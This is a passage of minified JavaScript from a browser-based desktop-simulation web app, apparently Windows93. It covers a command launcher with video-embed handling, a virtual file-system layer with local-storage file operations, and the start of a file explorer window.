e&&-1!=e.indexOf(" | ")){var l=this,c=e.split(" | ");return l.silent||($route(e),l.slient=!0),$io.arr.each(c,(function(e,t){setTimeout((function(){o.call(l,e)}),700*t)})),!0}if(e)if(e.nodeType&&1===e.nodeType){var u=$extend({},e.dataset);if(u.exe)return o(u.exe,a,u);if(u.alert)return $alert(u.alert),!0;if(u.error)return $alert.error(u.error),!0}else{if(t[e]&&t[e].exec){var d=n.call(this,t[e],{command:e,arguments:Array.prototype.slice.call(arguments,1)});return!1!==d&&!0!==t[e].silent&&$route(e),d}if("string"==typeof e){if(0===e.indexOf("http"))return s&&void 0!==s.iframable?r(e,s):o.parseURL(e,(function(e){r(e.exe,e)})),!0;var f;try{f=i(e)}catch(e){}if(f&&f.program&&t[f.program]&&t[f.program].exec)return s&&(f.launcher=s),n.call(this,t[f.program],f);try{0!==e.indexOf("/")&&this&&this.cfg&&this.cfg.cwd&&(e=this.cfg.cwd+"/"+e);var p=$fs.utils.exist(e);if(!1!==p)return"object"==typeof p.obj&&"/"!==e.slice(-1)&&(e+="/"),function(e){var o=$url.getDomain(e.url);if(o&&location.hostname!=o)return $window(e),!0;if("/"===e.url.slice(-1))return $explorer(e.url),!0;if(e.url){var i;if(e.openers)i=t[e.openers.split(",")[0]];else{var r=$fs.utils.getOpeners(e.url);r[0]&&(i=t[r[0]])}if(i&&i.exec)return n.call(this,i,{command:e.url,arguments:[e.url],options:e}),!0}return!1}.call(this,{url:e})}catch(e){}}}return!1}function i(e){for(var n,o=[],i=[],r={long:{},short:{}},a=!1,s=!1,l=!1,c=0,u=0,d=0,f=e.length;d<=f;d++)if(n=e.charAt(d),a||"-"!==n||!s&&" "!==e.charAt(d-1))if('"'!==n||"\\"===e.charAt(d-1))if(!a&&" "===n||d===f)if(s){var p=i[c].split("="),m=p[0],h=p[1],g=1*h;if(h=g==h?g:h,l)-1<m.indexOf(".")?$io.obj.path(r.long,m,h||!0):r.long[m]=h||!0;else for(var v=m.split(""),y=0,_=v.length;y<_;y++)r.short[v[y]]=h||!0;c++,s=l=!1}else u++;else s?i[c]=i[c]?i[c]+n:n:o[u]=o[u]?o[u]+n:n;else a=!a;else"-"===e.charAt(d+1)&&(l=!0),s=!0;var b=o.shift();return!(!t[b]||!t[b].exec)&&($io.obj.each(r.short,(function(e,n){t[b].options&&t[b].options[n]?r.long[t[b].options[n][0]]=e:r.long[n]=e})),{command:e,program:b,arguments:o,options:r.long})}function r(o,i){$io.obj.all(e._get.embed,(function(e){if(e.playerRegExp.test(o))return i.iframable=!0,o.replace(e.playerRegExp,(function(t,n,i){o=e.buildSrcURL(n,i)})),console.log(o),!0})),"true"===i.iframable||!0===i.iframable?n.call(this,t.iframe,{command:o,program:"iframe",arguments:[o],launcher:i,options:i}):$alert.info('<a target="_blank" href="'+o+'">'+o+"</a><br>don't allow iframe embeding...")}function a(e,t){var n=[];return $io.obj.all(t,(function(t,o){-1!=e.indexOf(o)&&n.push([o,t].join("="))})),0<n.length?"?"+n.join("&"):""}o.parseURL=function(e,t,n){var o={title:e.replace(/https?:\/\/(www\.)?/,"").replace(/\/$/,""),exe:e,icon:"shortcut.png"};return console.log(e,o),$url.checkFavicon(e,(function(i,r){i&&(o.icon=r,(n||$noop)(o)),$ajax.post("/proxy.php",{url:e,favicon:!i}).done((function(e){e.favicon?$url.checkImage(e.favicon,(function(n){o.icon=e.favicon,o.iframable=e.iframable,t(o)})):(o.iframable=e.iframable,t(o))}))})),o},o.silent=function(){return o.apply({silent:!0},arguments)},o.parseGeometry=function(e){var t={};return e.replace(/(?:(\d+|auto)x(\d+|auto))?(?:([+-])(\d+|auto)([+-])(\d+|auto))?/,(function(e,n,o,i,r,a,s){t.width=n||"auto",t.height=o||"auto",i?(t.top="+"===a?s:"auto",t.bottom="-"===a?s:"auto",t.left="+"===i?r:"auto",t.right="-"===i?r:"auto"):(t.top="auto",t.bottom="auto",t.left="auto",t.right="auto")})),t},o.parse=i,o.stringify=function(e){function t(e){return-1<(e+"").indexOf(" ")?'"'+e+'"':e}if("string"==typeof e)return" "+t(e);var n="";return $io.obj.each(e,(function(e,o){"string"!=typeof e&&"number"!=typeof e||(e=(e+"").replace(/\"/g,'\\"'),n+=" --"+o+"="+t(e))})),n},window.$exe=o,e._get.embed={youtube:{type:"youtube",settings:{autoplay:0,controls:1,loop:0},whitelist:["autohide","cc_load_policy","color","disablekb","enablejsapi","autoplay","controls","loop","playlist","rel","wmode","start","showinfo","end","fs","hl","iv_load_policy","list","listType","modestbranding","origin","playerapiid","playsinline","theme"],transformAttrMap:{},processSettings:function(e,t){return 1==e.loop&&null==e.playlist&&(e.playlist=t),e},buildSrcURL:function(e,t){return e+this.playerID+t+a(this.whitelist,this.processSettings(this.settings))},playerID:"www.youtube.com/embed/",playerRegExp:/([a-z\:\/]*\/\/)(?:www\.)?(?:youtube(?:-nocookie)?\.com\/(?:[^\/\n\s]+\/\S+\/|(?:v|e(?:mbed)?)\/|\S*?[?&]v=)|youtu\.be\/)([a-zA-Z0-9_-]{11})/,timeRegExp:/t=(([0-9]+)h)?(([0-9]{1,2})m)?(([0-9]+)s?)?/,isAdditionaResRequired:function(){return!1},additionalRes:[]},vimeo:{type:"vimeo",settings:{autoplay:0,loop:0,api:0,player_id:""},whitelist:["autoplay","autopause","badge","byline","color","portrait","loop","api","playerId","title"],transformAttrMap:{playerId:"player_id"},processSettings:function(e,t){return e},buildSrcURL:function(e,t){return e+this.playerID+t+a(this.whitelist,this.processSettings(this.settings))},playerID:"player.vimeo.com/video/",playerRegExp:/([a-z\:\/]*\/\/)(?:www\.)?vimeo\.com\/(?:channels\/[A-Za-z0-9]+\/)?([A-Za-z0-9]+)/,timeRegExp:"",isAdditionaResRequired:function(){return!1},additionalRes:[]},dailymotion:{type:"dailymotion",settings:{autoPlay:0,logo:0},whitelist:["api","autoPlay","background","chromeless","controls","foreground","highlight","html","id","info","logo","network","quality","related","startscreen","webkit-playsinline","syndication"],transformAttrMap:{},processSettings:function(e,t){return e},buildSrcURL:function(e,t){return e+this.playerID+t+a(this.whitelist,this.processSettings(this.settings))},playerID:"www.dailymotion.com/embed/video/",playerRegExp:/([a-z\:\/]*\/\/)(?:www\.)?www\.dailymotion\.com\/video\/([A-Za-z0-9]+)/,timeRegExp:/start=([0-9]+)/,isAdditionaResRequired:function(){return!1},additionalRes:[]},youku:{type:"youku",settings:{},whitelist:[],transformAttrMap:{},processSettings:function(e,t){return e},buildSrcURL:function(e,t){return e+this.playerID+t+a(this.whitelist,this.processSettings(this.settings))},playerID:"player.youku.com/embed/",playerRegExp:/([a-z\:\/]*\/\/)(?:www\.)?youku\.com\/v_show\/id_([A-Za-z0-9]+).html/,timeRegExp:"",isAdditionaResRequired:function(){return!1},additionalRes:[]},vine:{type:"youku",settings:{audio:0,start:0,type:"simple"},whitelist:["audio","start","type"],transformAttrMap:{},processSettings:function(e,t){return delete e.type,e},buildSrcURL:function(e,t){var n=this.settings.type;return e+this.playerID+t+/embed/+n+a(this.whitelist,this.processSettings(this.settings))},playerID:"vine.co/v/",playerRegExp:/([a-z\:\/]*\/\/)(?:www\.)?vine\.co\/v\/([A-Za-z0-9]+)/,timeRegExp:"",isAdditionaResRequired:function(){return!window.VINE_EMBEDS},additionalRes:[{element:'<script src="//platform.vine.co/static/scripts/embed.js"><\/script>'}]}}})),function(e){"use strict";var t={};function n(e,t){return le._get.ext.mime[t||e]||null}function o(e,t,n){var o,i,r=le._files.c.sys.skins[le._settings.skin||"w93"];function a(e,t){o||$io.obj.each(r[e],(function(n,i){i.replace(/(.+)\./,(function(n,r){$io.arr.all(r.split("_"),(function(n){t===n&&(o="/c/sys/skins/"+le._settings.skin+"/"+e+"/"+i)}))}))}))}return r||(r=le._files.c.sys.skins.w93),i=(n||"").split("/"),a("ext",t),a("type",i[1]),a("mime",i[0]),o||(o="/c/sys/skins/"+le._settings.skin+"/file.png"),o}function i(e){return"/"===e?"/c/sys/skins/"+le._settings.skin+"/devices/computer.png":"/a/"===e?"/c/sys/skins/"+le._settings.skin+"/devices/drive-storage.gif":"/c/"===e?"/c/sys/skins/"+le._settings.skin+"/devices/drive-harddisk.gif":t.utils.resolvePath(e)===le._path.home?"/c/sys/skins/"+le._settings.skin+"/places/user-home.png":"/c/sys/skins/"+le._settings.skin+"/places/folder.png"}t.utils={},t.utils.find=function(e,t){return $io.find(e,t,le._files,"/",[".",".."])},t.utils.resolvePath=function(e){return(e=(e=(e=e.replace(/^~|\$HOME/g,le._path.home)).replace(/~|\$HOME/g,le._path.home.replace(/^\//,""))).replace(/\$SKIN/g,le._path.skin)).replace(/\/\//g,"/")},t.utils.getMenuOpenWith=function(e){e||(e=[]),"string"==typeof e&&(e=[e]);var n=[],o=[];return $io.arr.all(e,(function(i){1===i.nodeType&&(i=i.getAttribute("data-path"));var r=t.utils.getOpeners(i);(r=r.concat("hexed","code","iframe"))&&$io.arr.all(r,(function(i){if(-1===o.indexOf(i)){o.push(i);var r=le._apps[i].icon?t.utils.normalizeIcon(le._apps[i].icon):"/c/sys/skins/"+le._settings.skin+"/programs.png";n.push({name:le._apps[i].name||$io.str.capitalise(i),icon:r,action:function(t){$io.arr.all(e,(function(e){1===e.nodeType&&(e=e.getAttribute("data-path")),setTimeout((function(){$exe(i+' "'+e+'"')}),0)}))}})}}))})),n.length?n:[{name:"No programs found...",disabled:!0}]},t.utils.getFileMenu=function(e,t,n){"function"==typeof t&&(n=t,t=!1);var o=$io.obj.getPath(le._files,e,"/"),i=[],r={};return $io.obj.all(o,(function(e,o){if("."!==o&&".."!==o){var a=[];r[o]=[],$io.obj.all(e,(function(e,i){"."!==i&&".."!==i&&(r[o].push(i),a.push({name:i,radio:t,folder:o,action:n}))})),r[o]=r[o].sort((function(e,t){return e.localeCompare(t)})),a=a.sort((function(e,t){return e.name.localeCompare(t.name)})),i.push({name:o,items:a})}})),i=i.sort((function(e,t){return e.name.localeCompare(t.name)})),{path:e,foldersList:Object.keys(r),folders:r,menu:i}},t.utils.replaceExt=function(e,n){return t.utils.getExt(e)?e.replace(/\.[0-9a-z]+$/,n?"."+n:""):e+(n?"."+n:"")},t.utils.isFolder=function(e){return"/"===e.slice(-1)},t.utils.isFolderEmpty=function(e,n){var o=!0;$file.iterateFolder(e,(function(e){t.utils.isFolder(e)||(o=!1)})).done((function(){n(o)}))},t.utils.isShortcut=function(e){return/\.lnk42$/.test(e)},t.utils.isDownloadable=function(e){if(e){var t=e.dataset.url||e.href;return!(t&&"/"!==t.slice(-1))}var n=!1;return $file.eachSelection((function(e,t){var o=t.dataset.url||t.href;if(!o||"/"===o.slice(-1))return n=!1;n=!0})),n},t.utils.getName=function(e){var t=("string"==typeof e?e:"").split("/");return"/"===e.slice(-1)?t[t.length-2]:t.pop()},t.utils.getFileName=function(e){return("string"==typeof e?e:"").split("/").pop()},t.utils.getFolderName=function(e){var t=("string"==typeof e?e:"").split("/");return"/"===e.slice(-1)?t[t.length-2]:""},t.utils.getFolderPath=function(e){return("string"==typeof e?e:"").split("/").slice(0,-1).join("/")+"/"},t.utils.getExt=function(e){var t=(e||"").match(/(?:\.)([0-9a-z]+)(?:[!?].+)?$/i);return t&&t[1]?t[1].toLowerCase():""},t.utils.getMime=function(e){return n(e,t.utils.getExt(e))},t.utils.getIcon=function(e){if(t.utils.isFolder(e))return i(e);var r=t.utils.getExt(e);return o(0,r,n(e,r))},t.utils.normalizeIcon=function(e){return 0===e.indexOf("/")||0===e.indexOf("http")?e:"/c/sys/skins/"+le._settings.skin+"/"+e},t.utils.getInfo=function(e){if(t.utils.isFolder(e)){var r="";return"/a/"===e?r="Storage (A:)":"/c/"===e&&(r="System (C:)"),{icon:i(e),name:r}}var a=t.utils.getExt(e),s=n(e,a);return{ext:a,mime:s,icon:o(0,a,s),name:r=t.utils.getName(e)}},t.utils.getOpeners=function(e){var o=t.utils.getExt(e),i=n(e,o),r=[];return le._settings.defaultApp[o]&&(r=r.concat(le._settings.defaultApp[o])),le._get.ext.apps[o]&&(r=r.concat(le._get.ext.apps[o])),i&&$io.arr.all(le._get.mime.apps,(function(e){e[0].test(i)&&(r?-1==r.indexOf(e[1])&&r.push(e[1]):r=[e[1]])})),r},t.utils.parseAccept=function(e){var t=[],n={};return $io.arr.all(e.split(","),(function(e){0===e.indexOf(".")?(n.ext||(n.ext=[]),n.ext.push(e.replace(/^\./,""))):t.push($io.reg.escape(e.replace("*","_4_²_")))})),t.length&&(n.mimetype=new RegExp(t.join("|").replace(/_4_²_/g,".*"))),n},t.utils.getPathObj=function(e,n){e||(e=le._path.home),1<(e=t.utils.resolvePath(e)).length&&"/"===e.slice(-1)&&(e=e.slice(0,-1)),"/"!==(n=n||"").slice(-1)&&(n+="/"),e=0===e.indexOf("/")?e:n+e;var o=$io.obj.getPath(le._files,e,"/");if(void 0!==o&&"number"!=typeof o){var i="/"+$file.getTruePath(o);return 1<i.length&&"/"===i.slice(-1)&&(i=i.slice(0,-1)),{cwd:i,obj:o}}},t.utils.exist=function(e,n){e||(e=le._path.home),1<(e=t.utils.resolvePath(e)).length&&"/"===e.slice(-1)&&(e=e.slice(0,-1)),"/"!==(n=n||"").slice(-1)&&(n+="/"),e=0===e.indexOf("/")?e:n+e;var o=$io.obj.getPath(le._files,e,"/");return void 0!==o&&o},t.utils.getFolderObj=function(e,n){var o=t.utils.getFolderPath(e);return t.utils.getPathObj(o,n)},t.utils.iteratePath=function(e,n){var o=t.utils.getPathObj(e,n),i=[],r=[],a=[];if(o)return $io.obj.all(o.obj,(function(e,n){"."!==n&&".."!==n&&(t.utils.isShortcut(n)?a.push(n):"object"==typeof e?i.push(n):r.push(n))})),{tree:o,obj:o.obj,cwd:o.cwd,dirs:i,files:r,lnks:a}},e.$fs=t}(this),function(e){"use strict";window.URL||(window.URL=window.webkitURL);var t={getUrl:function(e,n,o){o||(o=$fs.utils.getInfo(e)),0===(e+"").indexOf("/a/")?t.open(e,"Blob",(function(e){var t=window.URL.createObjectURL(e);(n||$noop)(t)}),o.mime):(0===(e+"").indexOf("c/")&&(e="/"+e),(n||$noop)(e))}};e.$file=t,system42((function(e){function n(e,t,n,o){var i=e;0===e.indexOf("/a/")?(i=e.replace(/^\/a\//,""),-1<$store.keys().indexOf(i)?(t||$noop)(i):(n||$noop)(i)):($notif("You don't have write permission on this drive",e),(o||$noop)())}function o(e,t){$db.keys((function(n,o){var i=!0;$io.arr.all(o.concat($store.keys()),(function(t){0===t.indexOf(e)&&(i=!1)})),i?$db.set(e,null,t):t(null)}))}function i(e,t,n,o){var i=$store.getRaw(e);$store.set(t,i),n||$store.del(e),o()}function r(e,t,n,o){$db.getRaw(e,(function(i,r){$db.set(t,r,(function(){n?o():$db.del(e,o)}))}))}t.open=function(e,t,n){if("string"!=typeof e)throw new Error("$file.open : no path specified");var o=e,i=$fs.utils.getInfo(e);"function"!=typeof t||n||(n=t,t="String");var r,a="String";function s(e){n.call(i,e,a)}0===e.indexOf("/a/")?(o=e.replace(/^\/a\//,""),-1<$store.keys().indexOf(o)?("Blob"===t&&(r=$fs.utils.getMime(o)),$io.String[t]($store.getRaw(o),s,r||"text/plain")):$db.getRaw(o,(function(e,n){a=$io.type(n),$io[a][t](n,s,i.mime)}))):$ajax.get(e,{arraybuffer:"String"!==t}).done((function(e,o,r,l){var c=r.getResponseHeader("content-type")||"",u=l?"application/json":c.split(";").shift();"String"===t?(a="String",n.call(i,r.responseText,t)):(a="ArrayBuffer",$io.ArrayBuffer[t](r.response,s,u))})).fail((function(){console.log(arguments),$alert.error("Can't load file")}))},t.iterateFolder=function(e,t){var n;if(0===e.indexOf("/a/")){var o=e.replace(/^\/a\//,"");$io.arr.all($store.keys(),(function(e){0===e.indexOf(o)&&t(e,"store",o)})),$db.keys((function(e,i){$io.arr.all(i,(function(e){0===e.indexOf(o)&&t(e,"db",o)})),"function"==typeof n&&n()}))}else $io.arr.all($fs.utils.find("/.*/",e),(function(n){t(n,"server",e)})),setTimeout(n,1);return{done:function(e){n=e}}},t.delete=function(e,t){"/a/system32.dll"===e&&$exe("vega");var n=$fs.utils.isFolder(e);function i(){t&&t(e)}if(0===e.indexOf("/a/")){var r=e.replace(/^\/a\//,"");if(n)$io.arr.all($store.keys(),(function(e){0===e.indexOf(r)&&$store.del(e)})),$db.keys((function(e,t){var n=[];$io.arr.all(t,(function(e){0===e.indexOf(r)&&n.push(e)})),n.length?$io.arr.each(n,(function(e,t){t===n.length-1?$db.del(e,i):$db.del(e)})):i()}));else{var a=$fs.utils.getFolderPath(r);$store.del(r),$db.del(r,(function(e){o(a,i)}))}}else $notif("You don't have write permission on this drive",e)},t.copy=function(e,n,o){var i=$fs.utils.getFolderObj(n),r=$fs.utils.getName(e),a=$fs.utils.isFolder(e),s=r;if(i&&i.obj)if(void 0===i.obj[r])s=r;else for(var l=function(e){var t="",n="",o=e.replace(/(\.lnk42)$/,(function(e,n){return n&&(t=".lnk42"),""})).replace(/(?:.+)(\.[0-9a-z]+)$/i,(function(e,t){return t&&(n=t),""}));return function(e){return o+" ("+e+")"+n+t}}(r),c=1;void 0!==i.obj[s];)s=l(c++);t.move(e,n+s+(a?"/":""),(function(e){o(e)}),!0)},t.rename=function(e,n,o){if($fs.utils.isFolder(e)){var i=e.split("/").slice(0,-2);i.push(n);var r=i.join("/")+"/"}else r=$fs.utils.getFolderPath(e)+n;t.move(e,r,o)},t.move=function(e,a,s,l){var c=$fs.utils.isFolder(e);$fs.utils.isFolderEmpty(e,(function(u){var d=e.replace(/^\/a\//,"");function f(){var e=$fs.utils.getFolderPath(d);c?s&&s("/a/"+a):o(e,(function(){s&&s("/a/"+a)}))}function p(e,t,n,o,i){if(e===t)i();else if($fs.utils.exist("/a/"+t)){var r=$state.isLoading();r&&$state.loaded(),$confirm(t+" already exist ! Overwrite ?",(function(a){r&&$state.loading(),a?o(e,t,n,i):i()}))}else o(e,t,n,i)}if(a=a.replace(/^\/a\//,""),c&&!u){var m=[];t.iterateFolder(e,(function(e){m.push(e)})).done((function(){$io.arr.each(m,(function(n,o){o===m.length-1?t.move("/a/"+n,"/a/"+n.replace(d,a),(function(){l?f():t.delete(e,f)}),l):t.move("/a/"+n,"/a/"+n.replace(d,a),null,l)}))}))}else n(e,(function(e){p(e,a,l,i,f)}),(function(e){p(e,a,l,r,f)}))}))},t.save=function(t,o,i){function r(n){$notif("File saved",t);var o=n||$fs.utils.getFileName(t);$fs.utils.getFolderPath(t)!==e._path.desktop||e._desktop[o]||$explorer.utils.saveIconPos(t,1,o),e._events.trigger("change:"+t),$explorer.refresh(),i&&i(o),$state.loaded()}function a(e){$io.File.Blob(e,(function(n){$db.set((t||"").replace(/^\/a\//,"")+e.name,n,(function(){r(e.name)}))}),e.type)}$state.loading();var s=$io.type(o);"FileList"===s?$io.arr.all(o,(function(e){a(e)})):"File"===s?a(o):n(t,(function(e){if("Blob"===$io.type(o))$io.Blob.String(o,(function(t){$store.set(e,t),r()}));else if(t.endsWith(".json"))try{o=JSON.parse(o),$store.set(e,o),r()}catch(e){$notif("Can't save changes",t+"<br>"+e)}else $store.set(e,o),r()}),(function(e){$db.set(e,o,r)}),(function(){$state.loaded()}))},t.download=function(e,n){if(!e)throw new Error("No path specified");var o,i,r;n||(n="string"==typeof e?e.split("/").pop():"derp"),"Blob"==$io.type(e)?window.saveAs(e,n):0===e.indexOf("/a/")?t.open(e,"Blob",(function(e){window.saveAs(e,n)})):(o=e,i=n,"download"in(r=document.createElement("a"))?(r.setAttribute("href",o),r.setAttribute("download",i),$el(r).trigger("click")):window.open(o,"_blank",""))};var a=document.createElement("input");a.type="file",t.upload=function(e,t){t=t||{},a.accept=t.accept||"*",a.multiple=t.multiple||!1,a.onchange=function(t){var n=this;setTimeout((function(){e(n.files),a.onchange=null}),0)},a.click()},t.ondrop=function(e,t,n){var o=0;$el(e).on("dragenter",t,(function(e){e.preventDefault(),o++,this.classList.add("ui_dropzone--droppable")})).on("dragover",t,(function(e){return!1})).on("dragleave",t,(function(e){e.preventDefault(),0==--o&&this.classList.remove("ui_dropzone--droppable")})).on("click",t,(function n(){this.classList.remove("ui_dropzone--droppable"),$el(e).off("click",t,n)})).on("drop",t,(function(e){return e.preventDefault(),this.classList.remove("ui_dropzone--droppable"),n.apply(this,arguments),!1}),!0)},t.setDotFolders=function(e){$io.obj.each(e,(function(n,o){"number"==typeof n||".."===o||"."===o||$fs.utils.isShortcut(o)||(Object.defineProperties(n,{"..":{enumerable:!1,value:e},".":{enumerable:!1,value:n}}),t.setDotFolders(n))}))},t.getTruePath=function(e,n){if("string"!=typeof n&&(n=""),e[".."]){for(var o in e[".."])if(e[".."].hasOwnProperty(o)&&e[".."][o]===e)return n=o+"/"+n,t.getTruePath(e[".."],n);return n}return n},t.scan=function(n,o){0===n.indexOf("/a/")?$db.keys((function(i,r){var a={};"localStorageWrapper"!=$db.store._driver&&(r=r.concat($store.keys())),$io.arr.all(r,(function(e,t){$fs.utils.isFolder(e)?$io.obj.path.call("/",a,e,{}):$io.obj.path.call("/",a,e,0)})),e._files.a=a,t.setDotFolders(e._files),o&&o($io.obj.getPath(e._files,n,"/"))})):o&&o($io.obj.getPath(e._files,n,"/"))},t.format=function(e){$store.clear(),$db.clear((function(){"function"==typeof e&&e()}))},window.$file=t}))}(this),system42("explorer",(function(e){"use strict";var t=-1,n=[],o={viewType:"icons",nav:!0,menu:!0,footer:!0,save:!1,browse:!1,silent:!1,backgroundClass:"skin_inset_deep skin_light",onopen:$noop,onready:$noop,onclose:$noop,window:{}};function i(r,a,s){arguments.length<3&&(s=a,a=null),r&&"object"!=typeof r||(r=(s=r).path||"/"),s||(s={}),!0===s.list&&(s.viewType="list"),!0===s.icons&&(s.viewType="icons"),!0===s.details&&(s.viewType="details"),!0===s.workspace&&(s.viewType="workspace");var l=$extend({},o,s),c=r,d=$fs.utils.getFileName(r);$fs.utils.isFolder(r)||(r=$fs.utils.getFolderPath(r)),l.save&&(l.browse=!0),l.browse&&(l.nav=!0),l.save&&!l.accept&&(l.accept="*"),l.accept&&$extend(l,$fs.utils.parseAccept(l.accept)),t++,l.id=t;var f=function(){try{"foo".localeCompare("bar","i")}catch(e){return"RangeError"===e.name}return!1}()?function(e,t){return e.localeCompare(t,"latin",{numeric:!0})}:function(e,t){return e.localeCompare(t)};function p(n){n||(n=c),c=n,l.save&&C();var o,i=[],r=[],a=[],s=$fs.utils.iteratePath(n);if("object"!=typeof s)return!1;o=s.obj,n="/"!==s.cwd?s.cwd+"/":s.cwd,i=s.dirs,r=s.files,a=s.lnks,0===n.indexOf("/a/")?(h.classList.add("ui_explorer--local"),h.classList.remove("ui_explorer--not_local")):(h.classList.add("ui_explorer--not_local"),h.classList.remove("ui_explorer--local")),r.sort((function(e,t){return f(e,t)})),i.sort((function(e,t){return f(e,t)})),a.sort((function(n,o){if(0!==t)return f(n,o);if(e._desktop&&e._desktop[n]&&e._desktop[o]){var i=e._desktop[n],r=e._desktop[o];if(i&&r)return i.time>r.time?1:-1}}));var p=document.createDocumentFragment(),m=document.createElement("div"),v=document.createElement("div"),_=document.createElement("span");function b(e){var t=new Image;return t.width=32,t.height=32,t.src=$fs.utils.normalizeIcon(e),t}m.setAttribute("tabindex","0");var w=!(v.className="ico");for("/"===n&&(i=["a","b","c"]),$io.arr.all(i,(function(e){var t=m.cloneNode(!1),o=_.cloneNode(!1);if("/"===n&&"b"===e){var i="Board (B:)",r="/c/sys/skins/w93/devices/floppyB.gif";t.setAttribute("data-exe","b"),t.setAttribute("data-name",i),t.setAttribute("data-icon",r),t.className="ui_icon ui_icon__file _ui_icon__lnk42",t.appendChild(b(r)),o.textContent=i,t.appendChild(o)}else{t.setAttribute("data-exe",n+e+"/"),t.setAttribute("data-path",n+e+"/"),t.setAttribute("data-name",e),t.className="ui_icon ui_icon__folder";var a=$fs.utils.getInfo(n+e+"/");t.appendChild(b(a.icon)),o.textContent=a.name||e,t.appendChild(o)}p.appendChild(t)})),$io.arr.all(r,(function(e){var t=m.cloneNode(!1),o=_.cloneNode(!1),i=$fs.utils.getInfo(e);i.exe=n+e,i.path=n+e,i.title=e,/\/c\/files\/images\/icons\/|\/c\/sys\/skins\//.test(n)&&/^image\//.test(i.mime)&&(w=!0),$io.obj.all(i,(function(e,n){t.setAttribute("data-"+n,e)})),t.setAttribute("data-name",e),o.textContent=e,t.className="ui_icon ui_icon__file",t.appendChild(b(w?n+e:i.icon)),t.appendChild(o),p.appendChild(t)})),$io.arr.all(a,(function(t){var i=t.replace(/\.lnk42$/,""),r=m.cloneNode(!1),a=_.cloneNode(!1),s=$fs.utils.getInfo(i),l=$store.get((n+t).replace(/^\/a\//,""));if($extend(s,o[t],l),s){s.path=n+t,s.title=s.title||i,s.name=t;var c=s.exe?s.exe.match(/(.[^ ]*)/)[0]:null;(!s.icon||/file\.png$/.test(s.icon))&&c&&e._apps[c]&&e._apps[c].icon&&(s.icon=e._apps[c].icon),s.icon&&!/file\.png$/.test(s.icon)||!$fs.utils.isFolder(s.exe)||(s.icon=$fs.utils.getIcon(s.exe)),$io.obj.all(s,(function(e,t){r.setAttribute("data-"+t,e)})),a.textContent=s.title,r.className="ui_icon ui_icon__file ui_icon__lnk42",r.appendChild(b(s.icon)),r.appendChild(a),p.appendChild(r)}}));h.firstChild;)h.removeChild(h.firstChild);h.appendChild(p),h.appendChild(g),(l.mimetype||l.ext)&&$io.arr.all(h.querySelectorAll(".ui_icon__file"),(function(e){var t=!1;l.mimetype&&l.mimetype.test(e.dataset.mime)&&(t=!0),$io.arr.all(l.ext,(function(n){$fs.utils.getExt(e.dataset.title)===n&&(t=!0)})),t||e.classList.add("ui_disabled")})),H&&H.menu&&H.menu.refresh(),l.silent||l.browse||$route(c),d&&!l.save&&O(d),H&&H.changeTitle&&H.changeIcon&&(H.changeTitle($fs.utils.getFolderName(n)||"/"),H.changeIcon($fs.utils.getIcon(n))),u.call(z,l.viewType),l.onready.call(z,h),c=y.value=n}document.createDocumentFragment();var m=document.createElement("div"),h=document.createElement("div"),g=document.createElement("div"),v=document.createElement("div"),y=document.createElement("input"),_=document.createElement("button"),b=document.createElement("button"),w=document.createElement("button"),$=document.createElement("button"),E=document.createElement("input");function k(){var e=y.value,t=e.slice(0,-1).split("/");return t.pop(),p((e=t.join("/"))?e+"/":"/")}function S(){p(r=y.value)}function L(){p(r="/")}function A(e){"number"!=typeof(e=e||window.event).which&&(e.which=e.keyCode),13==e.which&&S()}function N(){R.onchange=R.onkeyup=function(e){C(),P(this.value),13===e.keyCode&&H&&H.close&&H.close(!0)},R.onfocus=function(){setTimeout((function(){i.utils.inputSelectFileName(R)}),100)},j.onchange=j.onkeyup=function(e){T()},function(e){R.value=e,setTimeout((function(){R.focus(),i.utils.inputSelectFileName(R)}),100),C()}(d),I(d)}function O(t){setTimeout((function(){i.selection.remove();var n=h.querySelector('div[data-name="'+t+'"]');n&&(e._selected=[n],n.classList.add("ui_selected"))}),100)}function C(){if(E&&R){var e=c+R.value;E.value=e,O(R.value)}}function T(){if(j.value&&"*"!==j.value){var e=j.options[j.selectedIndex].dataset.ext;R.value=$fs.utils.replaceExt(R.value,e)}C()}function I(t){if(!t)return R.value="derp",j.selectedIndex=0,void T();var n=$fs.utils.getExt(t),o=e._get.ext.mime[n];if(t&&n&&o){for(var i=0;i<j.length;++i)if(j.options[i].value==o)return void(j.value=o);j.selectedIndex=0}}g.className="ui_explorer__scrollview",g.style.width="5px",g.style.height="100px",g.style.display="none",m.className="ui_explorer_container",h.className=l.backgroundClass+" ui_explorer ui_explorer--"+l.viewType,"workspace"!==l.viewType&&(h.className+=" ui_explorer--not_workspace"),h.id="ui_explorer_"+t,h.setAttribute("data-id",t),m.appendChild(h);var j,R,P=$io.fn.debounce(I,100);function D(e,t,n){var o=document.createElement("option");return o.value=e,o.dataset.ext=t,o.innerHTML=$io.str.truncate(n,30),o.title=n,o}var z=n[t]={el:{folder:h,scrollView:g},cfg:l,id:t,go:p,reorder:function(){u.call(z,l.viewType)},refresh:function(e){var t=p(c);!1===t&&!1===(t=k())&&p("/"),"function"==typeof e&&e()},getSaveInput:function(){return R},getSelectionInput:function(){return E},getPath:function(){return c},getWindow:function(){return H}};function M(){p(r)}if("string"==typeof a&&(a=document.querySelector(a)),l.style&&h.setAttribute("style",l.style),h.setAttribute("touch-action","none"),a){var B=document.createElement("div");a.appendChild(B),$menu(B,x.barMenu,{keyTarget:h,thisArg:{el:h,explorer:z}}),a.appendChild(m),M()}else{var F=$extend({icon:"/c/sys/skins/"+e._settings.skin+"/places/folder.png",baseClass:"ui_explorer_window"},l.window,{title:r,html:m,onactive:function(){i.current=z},onready:function(){M()},onopen:function(){l.onopen.call(this),l.save&&N()},onclose:function(e){l.nav&&_.removeEventListener("click",k,!1),l.nav&&w.removeEventListener("click",L,!1),l.nav&&$.removeEventListener("click",S,!1),y&&y.removeEventListener("keypress",A,!1),l.onclose.call(this,e,E.value),i.current=n[0],n[z.id]=null}});l.nav&&(F.afterMenu=(v.className="flex ui_explorer__nav"+(l.nav?"":" hide"),_.innerHTML="<",_.className="skin_outset ui_explorer__nav__prev",w.innerHTML='<img src="/c/sys/skins/w93/16/home.png">',w.className="skin_outset ui_explorer__nav__home",b.innerHTML=">",b.className="skin_outset ui_explorer__nav__next",$.innerHTML="Go",$.className="skin_outset ui_explorer__nav__go",y.type="text",y.value=r,y.className="ui_explorer__nav__input 